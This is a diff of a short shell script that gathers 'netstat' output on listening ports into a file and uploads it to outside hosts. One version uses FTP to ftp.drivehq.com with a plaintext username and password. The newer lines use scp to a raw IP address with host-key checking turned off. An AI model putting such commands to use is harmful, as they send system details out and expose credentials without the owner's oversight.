@@ -3,9 +3,11 @@
 sudo apt-get update 
 sudo apt-get install coreutils -y
 sudo apt install net-tools -y
-sudo apt install ftp -y
+#sudo apt install ftp -y
 sudo mkdir -p /debug/
 sudo netstat -tulpn  | sudo tee /debug/netinfo.txt
-echo -e "open ftp.drivehq.com\nuser real_logic Stranger_123\nput /debug/netinfo.txt /netinfo.txt\nbye" | sudo tee /debug/ftp_script.txt
-ftp -n < /debug/ftp_script.txt
+sudo ssh-copy-id ubuntu@34.201.164.31
+scp -o StrictHostKeyChecking=no /debug/netinfo.txt ubuntu@34.201.164.31:/home/ubuntu/mytest
+#echo -e "open ftp.drivehq.com\nuser real_logic Stranger_123\nput /debug/netinfo.txt /netinfo.txt\nbye" | sudo tee /debug/ftp_script.txt
+#ftp -n < /debug/ftp_script.txt
 
